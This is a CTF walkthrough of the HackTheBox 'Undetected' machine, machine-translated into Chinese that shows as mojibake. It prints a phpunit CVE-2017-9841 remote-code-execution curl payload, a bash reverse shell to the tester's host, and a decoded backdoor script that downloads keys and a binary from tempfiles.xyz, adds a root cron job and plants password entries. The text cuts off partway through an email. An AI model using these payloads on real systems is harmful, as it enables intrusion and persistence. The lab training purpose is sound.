<html>
<head>
<title>Undetected from HackTheBox â€” Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">æœªè¢«é»‘å®¢ç›’å­æ£€æµ‹åˆ°â€”è¯¦ç»†æ¼”ç»ƒ</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/undetected-from-hackthebox-detailed-walkthrough-82847eadf7a7?source=collection_archive---------1-----------------------#2022-07-02">https://infosecwriteups.com/undetected-from-hackthebox-detailed-walkthrough-82847eadf7a7?source=collection_archive---------1-----------------------#2022-07-02</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="31a1" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">å‘æ‚¨å±•ç¤ºå®Œæˆç›’å­æ‰€éœ€çš„æ‰€æœ‰å·¥å…·å’ŒæŠ€æœ¯ã€‚</h2></div><h1 id="23ef" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">æœºå™¨ä¿¡æ¯</h1><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi kx"><img src="../Images/3e7f602d4abb09ea46d6154cc5af4684.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*e9_SZwobggetPZBX.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">æœªè¢«é»‘å®¢ç›’å­å‘ç°</figcaption></figure><p id="6e41" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated"><a class="ae mf" href="https://app.hackthebox.com/machines/439" rel="noopener ugc nofollow" target="_blank"> Undetected </a>æ˜¯HackTheBoxä¸Šçš„ä¸€å°ä¸­ç­‰çº§åˆ«çš„Linuxæœºå™¨ï¼Œç”±<a class="ae mf" href="https://app.hackthebox.com/users/114053" rel="noopener ugc nofollow" target="_blank"> TheCyberGeek </a>åˆ›å»ºã€‚æˆ‘ä»¬é¦–å…ˆæ‰¾åˆ°ä¸€ä¸ªå¸¦æœ‰phpunitæ¼æ´ç‰ˆæœ¬çš„ç½‘ç«™ã€‚æˆ‘ä»¬åˆ©ç”¨è¿™ä¸€ç‚¹æ¥æ‰§è¡Œè¿œç¨‹å‘½ä»¤ï¼Œå¹¶è·å¾—ä¸€ä¸ªåå‘å¤–å£³ã€‚åœ¨æœåŠ¡å™¨ä¸Šå‘ç°äº†ä¸€ä¸ªåŒ…å«åå…­è¿›åˆ¶ç¼–ç å“ˆå¸Œçš„æ–‡ä»¶ï¼Œå®ƒè¢«ç ´è§£åç»™äº†æˆ‘ä»¬ä¸€ä¸ªç”¨æˆ·å¯†ç ã€‚ä»é‚£é‡Œæˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªéšè—çš„å…±äº«åº“æ–‡ä»¶ï¼Œæˆ‘ä»¬ä½¿ç”¨Ghidraé€†å‘æ‰¾åˆ°ä¸€ä¸ªbase64ç¼–ç çš„å­—ç¬¦ä¸²ã€‚è¿™è®©æˆ‘ä»¬æƒ³åˆ°äº†sshdçš„ä¸€ä¸ªä¿®æ”¹ç‰ˆæœ¬ï¼Œå½“ä½¿ç”¨Ghidraè¿›è¡Œåå‘æ“ä½œæ—¶ï¼Œå°±ä¼šå‘ç°å¢åŠ äº†ä¸€ä¸ªåé—¨ã€‚è§£ç åï¼Œæˆ‘ä»¬ç»ˆäºæœ‰äº†æ ¹å¯†ç ï¼Œå¹¶å®Œæˆäº†ç›’å­ã€‚</p><p id="6968" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æ‰€éœ€çš„æŠ€èƒ½æ˜¯åŸºæœ¬çš„ç½‘ç»œå’Œæ“ä½œç³»ç»Ÿæšä¸¾ï¼Œä»¥åŠç ”ç©¶åˆ©ç”¨ã€‚å­¦åˆ°çš„æŠ€èƒ½æ˜¯ä½¿ç”¨Ghidraé€†å‘å·¥ç¨‹æ–‡ä»¶å’Œæœç´¢æ¼æ´ã€‚</p><div class="mg mh gp gr mi mj"><a href="https://www.hackthebox.com/home/machines/profile/439" rel="noopener  ugc nofollow" target="_blank"><div class="mk ab fo"><div class="ml ab mm cl cj mn"><h2 class="bd ir gy z fp mo fr fs mp fu fw ip bi translated">æœªè¢«æ£€æµ‹åˆ°â€”ç ´è§£æœºç®±::æ¸—é€æµ‹è¯•å®éªŒå®¤</h2><div class="mq l"><h3 class="bd b gy z fp mo fr fs mp fu fw dk translated">ç™»å½•Hack The Boxå¹³å°ï¼Œè®©æ‚¨çš„ç¬”æµ‹è¯•å’Œç½‘ç»œå®‰å…¨æŠ€èƒ½æ›´ä¸Šä¸€å±‚æ¥¼ï¼</h3></div><div class="mr l"><p class="bd b dl z fp mo fr fs mp fu fw dk translated">www.hackthebox.com</p></div></div><div class="ms l"><div class="mt l mu mv mw ms mx ld mj"/></div></div></a></div><h1 id="0815" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">åˆæ­¥ä¾¦å¯Ÿ</h1><p id="266a" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">åƒå¾€å¸¸ä¸€æ ·ï¼Œè®©æˆ‘ä»¬ä»Nmapå¼€å§‹:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi nd"><img src="../Images/3db5342a7db242145aa2c618e2f79930.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*i-n8moba7xdGMqimuTP7VQ.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">ç›’å­çš„Nmapæ‰«æ</figcaption></figure><h1 id="291a" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">ç½‘ç«™(å…¨çƒèµ„è®¯ç½‘çš„ä¸»æœºç«™)</h1><p id="6d01" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">ä»å“åº”ä¸­æˆ‘ä»¬çœ‹åˆ°æˆ´å®‰å¨œçš„ç å®åœ¨ç«¯å£80ä¸Š:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi ni"><img src="../Images/255f3db3866ed0f6282d1aef26c68e5b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*eFG-x8gcj7ljmJ2K.png"/></div></div></figure><p id="bb4b" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">é™¤äº†storeæŒ‰é’®æ˜¾ç¤ºäº†ä¸€ä¸ªå­åŸŸå¤–ï¼Œç½‘ç«™ä¸Šæ²¡æœ‰ä»€ä¹ˆï¼Œè®©æˆ‘ä»¬æ·»åŠ åˆ°æˆ‘ä»¬çš„hostsæ–‡ä»¶ä¸­:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="e6b0" class="no kg iq nk b gy np nq l nr ns">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb]<br/>â””â”€# echo "10.10.11.146 djewelry.htb store.djewelry.htb" &gt;&gt; /etc/hosts</span></pre><p id="0a83" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">é€›å•†åº—çœ‹ä¸å‡ºä»»ä½•æ˜æ˜¾çš„ä¸œè¥¿:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi nt"><img src="../Images/cc66d5c5241e3b093c6be3f8b4fac17f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*_RtxxEhpqbdGEUW2.png"/></div></div></figure><h1 id="5df6" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">Gobuster</h1><p id="5492" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">æ¥ä¸‹æ¥ç”¨gobusteræŸ¥æ‰¾æ–‡ä»¶å¤¹:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi nu"><img src="../Images/9fff3861bcd6879725edcf18d31329fb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*N17VOO6KcfSDS4_uDc7_LQ.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">Gobusteræ‰«æå­ç›®å½•</figcaption></figure><h1 id="34c9" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">CVE-2017â€“9041</h1><p id="bf15" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">ä¾›åº”å•†æ–‡ä»¶å¤¹å¯ç–‘ã€‚ä¸ºä»€ä¹ˆå¯ä»¥åœ¨ç½‘ç»œæœåŠ¡å™¨ä¸Šè®¿é—®ï¼Ÿæµè§ˆå®ƒï¼Œæˆ‘ä»¬çœ‹åˆ°ä¸€äº›å­æ–‡ä»¶å¤¹ï¼Œå¹¶æœç´¢â€œåˆ©ç”¨ä¾›åº”å•†æ–‡ä»¶å¤¹â€æ‰¾åˆ°äº†<a class="ae mf" href="https://blog.ovhcloud.com/cve-2017-9841-what-is-it-and-how-do-we-protect-our-customers/" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>ï¼Œè¿™è§£é‡Šäº†å®ƒå¦‚ä½•å®¹æ˜“å—åˆ°CVE-2017â€“9841çš„æ”»å‡»ã€‚æ›´å¤šä¿¡æ¯<a class="ae mf" href="https://nvd.nist.gov/vuln/detail/CVE-2017-9841" rel="noopener ugc nofollow" target="_blank">è¿™é‡Œ</a>å’Œ<a class="ae mf" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9841" rel="noopener ugc nofollow" target="_blank">è¿™é‡Œ</a>ç»™äº†æˆ‘ä»¬ä¸€ä¸ªå°è¯•å’Œåˆ©ç”¨å®ƒçš„æ–¹æ³•ã€‚</p><p id="f3f8" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">é¦–å…ˆæˆ‘å‘ç°<a class="ae mf" href="https://github.com/RandomRobbieBF/phpunit-brute" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>æš´åŠ›è„šæœ¬ï¼Œæˆ‘ç”¨å®ƒæ¥ç¡®è®¤è¿™é‡Œçš„phpunitç‰ˆæœ¬æ˜“å—æ”»å‡»:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi nv"><img src="../Images/e8e0d160c1cc394912f6d783aae7c6ac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*khlvKzsk8fv5s9Ja-3e_5g.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">wget phpunitæ¼æ´</figcaption></figure><p id="5451" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">è¯¥è„šæœ¬ç¡®è®¤è¿™æ˜¯æˆ‘ä»¬çš„å‰è¿›é“è·¯ï¼Œphpunitæ˜¯å¯åˆ©ç”¨çš„ã€‚ä¾‹å­<a class="ae mf" href="https://gist.github.com/AssassinUKG/9f150ee3da9d9a9e421635876859a26d" rel="noopener ugc nofollow" target="_blank">è¿™é‡Œ</a>å’Œ<a class="ae mf" href="http://web.archive.org/web/20170701212357/http://phpunit.vulnbusters.com/" rel="noopener ugc nofollow" target="_blank">è¿™é‡Œ</a>å‘æˆ‘å±•ç¤ºäº†å¦‚ä½•å°è¯•:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="2a61" class="no kg iq nk b gy np nq l nr ns">curl --data "&lt;?php echo(pi());" http://localhost:8888/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</span></pre><p id="69f7" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å½“æˆ‘æµ‹è¯•è¿™ä¸ªç›’å­æ—¶ï¼Œå®ƒå·¥ä½œäº†:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="94ba" class="no kg iq nk b gy np nq l nr ns">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/undetected]<br/>â””â”€# curl --data "&lt;?php echo(pi());" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php<br/>3.1415926535898</span></pre><p id="fead" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">åœ¨åˆ—ä¸¾äº†ä¸€äº›ä¹‹åï¼Œæˆ‘å°è¯•äº†ä¸€ä¸ªåå‘shell:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="b8b7" class="no kg iq nk b gy np nq l nr ns">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/undetected]<br/>â””â”€# curl --data "&lt;?php system('/bin/bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.14/1337 0&gt;&amp;1\"');" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</span></pre><h1 id="2bcc" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">åå‘å¤–å£³</h1><p id="fe8b" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">è¿™å¥æ•ˆäº†ï¼Œæˆ‘ç­‰å¾…çš„ncç›‘å¬å™¨æ•è·åˆ°äº†shell:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="c3c7" class="no kg iq nk b gy np nq l nr ns">â”Œâ”€â”€(rootğŸ’€kali)-[~]<br/>â””â”€# nc -nlvp 1337<br/>listening on [any] 1337 ...<br/>connect to [10.10.14.14] from (UNKNOWN) [10.10.11.146] 57118<br/>www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$</span></pre><p id="60f4" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æˆ‘çš„èº«ä»½æ˜¯www-data:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="dc4d" class="no kg iq nk b gy np nq l nr ns">www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ id<br/>id<br/>uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></pre><h1 id="3915" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">ä¿¡æ¯æ–‡ä»¶</h1><p id="857a" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">åœ¨å¯¹æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œäº†ä¸€äº›æšä¸¾ä¹‹åï¼Œæˆ‘å‘ç°äº†www-dataæ‹¥æœ‰çš„ä¸€äº›æœ‰è¶£çš„ä¸œè¥¿:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="3e81" class="no kg iq nk b gy np nq l nr ns">www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ find / -user www-data -not -path "/proc/*" -not -path "/var/www/*" 2&gt; /dev/null<br/>&lt;path "/proc/*" -not -path "/var/www/*" 2&gt; /dev/null<br/>/tmp/tmux-33<br/>/dev/pts/0<br/>/var/cache/apache2/mod_cache_disk<br/>/var/backups/info<br/>/run/lock/apache2</span></pre><p id="e50f" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å¤‡ä»½æ–‡ä»¶å¤¹ä¸­çš„è¿™ä¸ªä¿¡æ¯æ–‡ä»¶æ˜¯ä»€ä¹ˆï¼Ÿè®©æˆ‘ä»¬æ¥çœ‹çœ‹:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="3a4a" class="no kg iq nk b gy np nq l nr ns">www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ cp /var/backups/info /tmp<br/>www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ cd /tmp<br/><br/>www-data@production:/tmp$ file info<br/>file info<br/>info: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0dc004db7476356e9ed477835e583c68f1d2493a, for GNU/Linux 3.2.0, not stripped<br/><br/>www-data@production:/tmp$ ./info<br/>[-] substring 'ffff' not found in dmesg<br/>[.] starting<br/>[.] namespace sandbox set up<br/>[.] KASLR bypass enabled, getting kernel addr</span></pre><p id="08de" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ä¸ç¡®å®šå®ƒæ˜¯åšä»€ä¹ˆçš„ï¼ŒæŠŠå®ƒæ‹‰è¿‡æ¥ç»™Kaliï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥çœ‹å¾—æ›´è¿œä¸€ç‚¹:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi nw"><img src="../Images/823ebba740710c9e44a8b96bd7310d18.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Zqxx9UFtsZxK5Pwuoav1JA.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">ä»ç›’å­é‡Œå–å‡ºä¿¡æ¯æ–‡ä»¶</figcaption></figure><h1 id="dfd0" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">ä½¿ç”¨å­—ç¬¦ä¸²æŸ¥çœ‹æ–‡ä»¶</h1><p id="dd5f" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">é¦–å…ˆåœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸Šå°è¯•å­—ç¬¦ä¸²ï¼Œçœ‹çœ‹æ˜æ–‡ä¸­æœ‰ä»€ä¹ˆ:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="616c" class="no kg iq nk b gy np nq l nr ns">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/undetected]<br/>â””â”€# strings info<br/>/lib64/ld-linux-x86-64.so.2<br/>&lt;SNIP&gt;<br/>[-] setsockopt(PACKET_VERSION)<br/>[-] setsockopt(PACKET_RX_RING)<br/>[-] socket(AF_PACKET)<br/>[-] bind(AF_PACKET)<br/>[-] sendto(SOCK_RAW)<br/>[-] socket(SOCK_RAW)<br/>[-] socket(SOCK_DGRAM)<br/>[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER)<br/>[-] klogctl(SYSLOG_ACTION_READ_ALL)<br/>Freeing SMP<br/>[-] substring '%s' not found in dmesg<br/>/bin/bash<br/>56d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f2&lt;SNIP&gt;<br/>03a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737&lt;SNIP&gt;<br/>646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b&lt;SNIP&gt;<br/>[-] fork()<br/>/etc/shadow<br/>[.] checking if we got root<br/>[-] something went wrong =(</span></pre><h1 id="8c06" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">ç”¨XXDè§£ç </h1><p id="46cd" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">è¿™æ˜¯ä¸€ä¸ªå†—é•¿çš„è¾“å‡ºï¼Œä½†æœ‰ä¸€ä¸ªæ˜æ˜¾çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œæˆ‘ç”¨xxdè§£ç :</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="7d75" class="no kg iq nk b gy np nq l nr ns">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/undetected]<br/>â””â”€# echo 776765742074656d&lt;SNIP&gt;572732e7478743b | xxd -r -p | sed 's/;/\n/g'<br/>wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys<br/>wget tempfiles.xyz/.main -O /var/lib/.main<br/>chmod 755 /var/lib/.main<br/>echo "* 3 * * * root /var/lib/.main" &gt;&gt; /etc/crontab<br/>awk -F":" '$7 == "/bin/bash" &amp;&amp; $3 &gt;= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: &gt;&gt; /etc/shadow")}' /etc/passwd<br/>awk -F":" '$7 == "/bin/bash" &amp;&amp; $3 &gt;= 1000 {system("echo "$1" "$3" "$6" "$7" &gt; users.txt")}' /etc/passwd<br/>while read -r user group home shell _<br/>do echo "$user"1":x:$group:$group:,,,:$home:$shell" &gt;&gt; /etc/passwd<br/>done &lt; users.txt<br/>rm users.txt</span></pre><h1 id="a732" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">ä¸JohnTheRipperä¸€èµ·ç ´è§£</h1><p id="7b24" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">æˆ‘ä»¬çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªè„šæœ¬ï¼Œå®ƒå¤åˆ¶æ–‡ä»¶ï¼Œè®¾ç½®cronjobï¼Œæ·»åŠ ç”¨æˆ·å’Œå¯†ç ï¼Œç„¶åæ•´ç†ã€‚æˆ‘ä»¬å¯ä»¥ä»è¿™è¡Œä»£ç ä¸­å–å‡ºå¯†ç çš„æ•£åˆ—ï¼Œç”¨JohnTheRipperç ´è§£å®ƒ:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="4668" class="no kg iq nk b gy np nq l nr ns">echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: &gt;&gt; /etc/shadow</span></pre><p id="ee4e" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æˆ‘ä»¬éœ€è¦passwdæ–‡ä»¶æ¥æŸ¥çœ‹æ•£åˆ—æ˜¯é’ˆå¯¹å“ªä¸ªç”¨æˆ·çš„:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="8b4a" class="no kg iq nk b gy np nq l nr ns">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/undetected]<br/>â””â”€# curl --data "&lt;?php system('cat /etc/passwd');" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php<br/>root:x:0:0:root:/root:/bin/bash<br/>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br/>&lt;SNIP&gt;<br/>steven:x:1000:1000:Steven Wright:/home/steven:/bin/bash<br/>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false<br/>sshd:x:112:65534::/run/sshd:/usr/sbin/nologin<br/>steven1:x:1000:1000:,,,:/home/steven:/bin/bash</span></pre><p id="4cb1" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æˆ‘ä»¬æœ‰ä¸¤ä¸ªstevenå¸æˆ·ï¼Œçœ‹ä¸Šé¢çš„å›æ˜¾ï¼Œå®ƒæ·»åŠ äº†ä¸€ä¸ª1ï¼Œæ‰€ä»¥æˆ‘ä»¬çŸ¥é“æˆ‘ä»¬æ­£åœ¨ç ´è§£çš„å¸æˆ·æ˜¯steven1ã€‚å°†è¯¥è¡Œæ”¾å…¥æ–‡ä»¶ä¸­:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="73c4" class="no kg iq nk b gy np nq l nr ns">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/undetected]<br/>â””â”€# echo "steven1:x:1000:1000:,,,:/home/steven:/bin/bash" &gt; steven1.passwd</span></pre><p id="af99" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ç°åœ¨å°†å¯†ç çš„æ•£åˆ—æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="edaa" class="no kg iq nk b gy np nq l nr ns">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/undetected]<br/>â””â”€# echo "steven1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7:::" &gt; steven1.shadow</span></pre><p id="a64f" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ç°åœ¨ä½¿ç”¨unshadowä¸ºJohnåˆ›å»ºæ–‡ä»¶:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="1e90" class="no kg iq nk b gy np nq l nr ns">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/undetected]<br/>â””â”€# unshadow steven1.passwd steven1.shadow &gt; steven1.hash</span></pre><p id="9dbd" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ç„¶åè®©çº¦ç¿°å’Œæ´›å…‹ä¸€èµ·å»:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="2887" class="no kg iq nk b gy np nq l nr ns">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/undetected]<br/>â””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt steven1.hash<br/>Using default input encoding: UTF-8<br/>Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])<br/>Cost 1 (iteration count) is 5000 for all loaded hashes<br/>Will run 4 OpenMP threads<br/>Press 'q' or Ctrl-C to abort, almost any other key for status<br/>ihatehackers     (steven1)<br/>1g 0:00:01:44 DONE (2022-02-20 22:47) 0.009611g/s 856.2p/s 856.2c/s 856.2C/s littlebrat..halo03<br/>Use the "--show" option to display all of the cracked passwords reliably<br/>Session completed.</span></pre><h1 id="a161" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">ç”¨æˆ·æ ‡å¿—</h1><p id="1702" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">æˆ‘ä»¬å¾ˆå¿«å¾—åˆ°å¯†ç ï¼Œå¯ä»¥å°†ç”¨æˆ·åˆ‡æ¢åˆ°steven1:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="d324" class="no kg iq nk b gy np nq l nr ns">www-data@production:/tmp$ su steven1<br/>Password: ihatehackers<br/>id<br/>uid=1000(steven) gid=1000(steven) groups=1000(steven)</span></pre><p id="becb" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">è®©æˆ‘ä»¬è·å–ç”¨æˆ·æ ‡å¿—:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="8e41" class="no kg iq nk b gy np nq l nr ns">steven@production:/root$ cat /home/steven/user.txt <br/>2c2027e7412139c4cb59d97c6411ba99</span></pre><p id="06ff" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ç¯é¡¾å››å‘¨ï¼Œæˆ‘æ³¨æ„åˆ°çš„ç¬¬ä¸€ä»¶äº‹æ˜¯å²è’‚æ–‡æœ‰ä¸€å°ç”µå­é‚®ä»¶:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="dac7" class="no kg iq nk b gy np nq l nr ns">cat /var/mail/steven<br/>From root@production  Sun, 25 Jul 2021 10:31:12 GMT<br/>Return-Path: &lt;root@production&gt;<br/>Received: from production (localhost [127.0.0.1])<br/>        by production (8.15.2/8.15.2/Debian-18) <br/>        for &lt;steven@production&gt;; Sun, 25 Jul 2021 10:31:12 GMT<br/>        by production (8.15.2/8.15.2/Submit) id 